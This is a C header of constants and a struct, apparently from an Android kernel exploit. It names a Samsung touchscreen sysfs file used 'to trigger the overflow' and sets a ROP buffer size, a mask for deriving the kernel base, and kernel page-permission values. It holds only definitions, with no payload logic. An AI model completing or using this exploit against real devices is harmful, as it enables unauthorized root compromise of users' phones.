#ifndef __MISC_DEFS_H__
#define __MISC_DEFS_H__

/**
 * The default size of the stack-allocated TSP buffer.
 */
#define TSP_BUFFER_SIZE (256)

/**
 * The number of QWORDs in the ROP buffer.
 */
#define ROP_BUFFER_SIZE (60)

/**
 * The path of the TSP file used to trigger the overflow.
 */
#define TSP_PATH ("/sys/devices/virtual/sec/tsp/cmd")

/**
 * The size of the buffer used when reading the result from seqnum.
 */
#define SEQNUM_BUFFER_SIZE (128)

/**
 * The path of the uevent_seqnum sysfs file
 */
#define UEVENT_SEQNUM_PATH ("/sys/kernel/uevent_seqnum")

/**
 * The path to the pm_qos file.
 */
#define PM_QOS_PATH ("/sys/kernel/debug/pm_qos")

/**
 * The mask used to retrieve the LPASS shift from the current kernel base.
 */
#define LPASS_MASK (0x000000FFFFFFFFFFULL)


typedef long pthread_t;

struct args_structure {
  unsigned long exec_func;
  unsigned long arg0;
  unsigned long arg1;
  unsigned long arg2;
  unsigned long arg3;
  unsigned long arg4;
  unsigned long arg5;
  unsigned long arg6;
  volatile unsigned long res;
};

/**
 * The magic value used as a place-holder in the userspace buffer when
 * polling for the return address from the kernel.
 */
#define MAGIC_RES_VALUE (0xDEADBEEFD00DABCDULL)

//Misc userspace definitions
#define RTLD_NOW 001
#define O_RDONLY 00000000
#define O_WRONLY 00000001
#define O_RDWR 00000002
#define O_CREAT 0x0100
#define NULL ((void *)0)

//Misc kernel-space definitions
#define PAGE_KERNEL_EXEC (0x2E0000000000713ULL)
#define PAGE_KERNEL (0x2E0000000000713ULL)
#define GFP_KERNEL (0xD0ULL)
#define __GFP_HIGHMEM (0x2ULL)

//From errno.h
#define EINVAL 22
#define ENOENT 2
#define ENOTSUP 95

#endif
